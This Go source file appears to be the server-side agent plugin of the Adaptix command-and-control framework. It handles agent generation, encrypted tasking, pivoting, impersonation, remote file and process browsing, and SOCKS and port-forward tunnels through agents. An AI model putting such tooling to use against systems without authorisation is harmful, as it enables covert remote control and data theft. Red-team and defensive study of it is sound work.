package main

import (
	"encoding/hex"
	"encoding/json"
	"errors"
	"github.com/Adaptix-Framework/axc2"
	"math/rand"
	"time"
)

const (
	OS_UNKNOWN = 0
	OS_WINDOWS = 1
	OS_LINUX   = 2
	OS_MAC     = 3

	TYPE_TASK       = 1
	TYPE_BROWSER    = 2
	TYPE_JOB        = 3
	TYPE_TUNNEL     = 4
	TYPE_PROXY_DATA = 5

	MESSAGE_INFO    = 5
	MESSAGE_ERROR   = 6
	MESSAGE_SUCCESS = 7

	DOWNLOAD_STATE_RUNNING  = 1
	DOWNLOAD_STATE_STOPPED  = 2
	DOWNLOAD_STATE_FINISHED = 3
	DOWNLOAD_STATE_CANCELED = 4
)

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsAgentProcessData(agentId string, bodyData []byte) error

	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentImpersonate(agentId string, impersonated string, elevated bool) error
	TsAgentTerminate(agentId string, terminateTaskId string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)
	TsAgentConsoleOutputClient(agentId string, client string, messageType int, message string, clearText string)

	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskQueueGetAvailable(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error

	TsClientGuiDisks(taskData adaptix.TaskData, jsonDrives string)
	TsClientGuiFiles(taskData adaptix.TaskData, path string, jsonFiles string)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiProcess(taskData adaptix.TaskData, jsonFiles string)

	TsTunnelCreateSocks4(AgentId string, Address string, Port int, FuncMsgConnectTCP func(channelId int, addr string, port int) adaptix.TaskData, FuncMsgWriteTCP func(channelId int, data []byte) adaptix.TaskData, FuncMsgClose func(channelId int) adaptix.TaskData) (string, error)
	TsTunnelCreateSocks5(AgentId string, Address string, Port int, FuncMsgConnectTCP, FuncMsgConnectUDP func(channelId int, addr string, port int) adaptix.TaskData, FuncMsgWriteTCP, FuncMsgWriteUDP func(channelId int, data []byte) adaptix.TaskData, FuncMsgClose func(channelId int) adaptix.TaskData) (string, error)
	TsTunnelCreateSocks5Auth(AgentId string, Address string, Port int, Username string, Password string, FuncMsgConnectTCP, FuncMsgConnectUDP func(channelId int, addr string, port int) adaptix.TaskData, FuncMsgWriteTCP, FuncMsgWriteUDP func(channelId int, data []byte) adaptix.TaskData, FuncMsgClose func(channelId int) adaptix.TaskData) (string, error)
	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelCreateLocalPortFwd(AgentId string, Address string, Port int, FwdAddress string, FwdPort int, FuncMsgConnect func(channelId int, addr string, port int) adaptix.TaskData, FuncMsgWrite func(channelId int, data []byte) adaptix.TaskData, FuncMsgClose func(channelId int) adaptix.TaskData) (string, error)
	TsTunnelStopLocalPortFwd(AgentId string, Port int)
	TsTunnelCreateRemotePortFwd(AgentId string, Port int, FwdAddress string, FwdPort int, FuncMsgReverse func(tunnelId int, port int) adaptix.TaskData, FuncMsgWrite func(channelId int, data []byte) adaptix.TaskData, FuncMsgClose func(channelId int) adaptix.TaskData) (string, error)
	TsTunnelStateRemotePortFwd(tunnelId int, result bool) (string, string, error)
	TsTunnelStopRemotePortFwd(AgentId string, Port int)
	TsTunnelConnectionClose(channelId int)
	TsTunnelConnectionResume(AgentId string, channelId int)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
}

type ModuleExtender struct {
	ts Teamserver
}

var (
	ModuleObject   *ModuleExtender
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) any {
	ModuleDir = moduleDir
	AgentWatermark = watermark

	ModuleObject = &ModuleExtender{
		ts: ts.(Teamserver),
	}
	return ModuleObject
}

func (m *ModuleExtender) AgentGenerate(config string, operatingSystem string, listenerWM string, listenerProfile []byte) ([]byte, string, error) {
	var (
		listenerMap  map[string]any
		agentProfile []byte
		err          error
	)

	err = json.Unmarshal(listenerProfile, &listenerMap)
	if err != nil {
		return nil, "", err
	}

	agentProfile, err = AgentGenerateProfile(config, operatingSystem, listenerWM, listenerMap)
	if err != nil {
		return nil, "", err
	}

	return AgentGenerateBuild(config, operatingSystem, agentProfile, listenerMap)
}

func (m *ModuleExtender) AgentCreate(beat []byte) (adaptix.AgentData, error) {
	return CreateAgent(beat)
}

func (m *ModuleExtender) AgentCommand(client string, cmdline string, agentData adaptix.AgentData, args map[string]any) error {
	command, ok := args["command"].(string)
	if !ok {
		return errors.New("'command' must be set")
	}

	taskData, messageData, err := CreateTask(m.ts, agentData, command, args)
	if err != nil {
		return err
	}

	m.ts.TsTaskCreate(agentData.Id, cmdline, client, taskData)

	if len(messageData.Message) > 0 || len(messageData.Text) > 0 {
		m.ts.TsAgentConsoleOutput(agentData.Id, messageData.Status, messageData.Message, messageData.Text, false)
	}

	return nil
}

func (m *ModuleExtender) AgentPackData(agentData adaptix.AgentData, maxDataSize int) ([]byte, error) {
	tasks, err := m.ts.TsTaskQueueGetAvailable(agentData.Id, maxDataSize)
	if err != nil {
		return nil, err
	}

	packedData, err := PackTasks(agentData, tasks)
	if err != nil {
		return nil, err
	}

	return AgentEncryptData(packedData, agentData.SessionKey)
}

func (m *ModuleExtender) AgentPivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	packData, err := PackPivotTasks(pivotId, data)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	randomBytes := make([]byte, 16)
	rand.Read(randomBytes)
	uid := hex.EncodeToString(randomBytes)[:8]

	taskData := adaptix.TaskData{
		TaskId: uid,
		Type:   TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, nil
}

func (m *ModuleExtender) AgentProcessData(agentData adaptix.AgentData, packedData []byte) ([]byte, error) {
	decryptData, err := AgentDecryptData(packedData, agentData.SessionKey)
	if err != nil {
		return nil, err
	}

	taskData := adaptix.TaskData{
		Type:        TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	resultTasks := ProcessTasksResult(m.ts, agentData, taskData, decryptData)

	for _, task := range resultTasks {
		m.ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil, nil
}

/// BROWSERS

func (m *ModuleExtender) AgentDownloadChangeState(agentData adaptix.AgentData, newState int, fileId string) (adaptix.TaskData, error) {
	packData, err := BrowserDownloadChangeState(fileId, newState)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	taskData := adaptix.TaskData{
		Type: TYPE_BROWSER,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}

func (m *ModuleExtender) AgentBrowserDisks(agentData adaptix.AgentData) (adaptix.TaskData, error) {
	packData, err := BrowserDisks(agentData)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	taskData := adaptix.TaskData{
		Type: TYPE_BROWSER,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}

func (m *ModuleExtender) AgentBrowserProcess(agentData adaptix.AgentData) (adaptix.TaskData, error) {
	packData, err := BrowserProcess(agentData)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	taskData := adaptix.TaskData{
		Type: TYPE_BROWSER,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}

func (m *ModuleExtender) AgentBrowserFiles(path string, agentData adaptix.AgentData) (adaptix.TaskData, error) {
	packData, err := BrowserFiles(path, agentData)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	taskData := adaptix.TaskData{
		Type: TYPE_BROWSER,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}

func (m *ModuleExtender) AgentBrowserUpload(path string, content []byte, agentData adaptix.AgentData) (adaptix.TaskData, error) {
	packData, err := BrowserUpload(m.ts, path, content, agentData)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	taskData := adaptix.TaskData{
		Type: TYPE_BROWSER,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}

func (m *ModuleExtender) AgentBrowserDownload(path string, agentData adaptix.AgentData) (adaptix.TaskData, error) {
	packData, err := BrowserDownload(path, agentData)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	taskData := adaptix.TaskData{
		Type: TYPE_TASK,
		Data: packData,
		Sync: true,
	}

	return taskData, nil
}

func (m *ModuleExtender) AgentBrowserExit(agentData adaptix.AgentData) (adaptix.TaskData, error) {
	packData, err := BrowserExit(agentData)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	taskData := adaptix.TaskData{
		Type: TYPE_TASK,
		Data: packData,
		Sync: true,
	}

	return taskData, nil
}

func (m *ModuleExtender) AgentBrowserJobKill(jobId string) (adaptix.TaskData, error) {
	packData, err := BrowserJobKill(jobId)
	if err != nil {
		return adaptix.TaskData{}, err
	}

	taskData := adaptix.TaskData{
		Type: TYPE_TASK,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}

/// SYNC

func SyncBrowserDisks(ts Teamserver, taskData adaptix.TaskData, drivesSlice []adaptix.ListingDrivesData) {
	jsonDrives, err := json.Marshal(drivesSlice)
	if err != nil {
		return
	}

	ts.TsClientGuiDisks(taskData, string(jsonDrives))
}

func SyncBrowserFiles(ts Teamserver, taskData adaptix.TaskData, path string, filesSlice []adaptix.ListingFileData) {
	jsonDrives, err := json.Marshal(filesSlice)
	if err != nil {
		return
	}

	ts.TsClientGuiFiles(taskData, path, string(jsonDrives))
}

func SyncBrowserFilesStatus(ts Teamserver, taskData adaptix.TaskData) {
	ts.TsClientGuiFilesStatus(taskData)
}

func SyncBrowserProcess(ts Teamserver, taskData adaptix.TaskData, processlist []adaptix.ListingProcessData) {
	jsonProcess, err := json.Marshal(processlist)
	if err != nil {
		return
	}

	ts.TsClientGuiProcess(taskData, string(jsonProcess))
}

/// TYPE_TUNNEL

func TunnelMessageConnectTCP(channelId int, address string, port int) adaptix.TaskData {
	packData, _ := TunnelCreateTCP(channelId, address, port)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageConnectUDP(channelId int, address string, port int) adaptix.TaskData {
	packData, _ := TunnelCreateUDP(channelId, address, port)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	packData, _ := TunnelWriteTCP(channelId, data)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	packData, _ := TunnelWriteUDP(channelId, data)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	packData, _ := TunnelClose(channelId)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	packData, _ := TunnelReverse(tunnelId, port)

	taskData := adaptix.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}
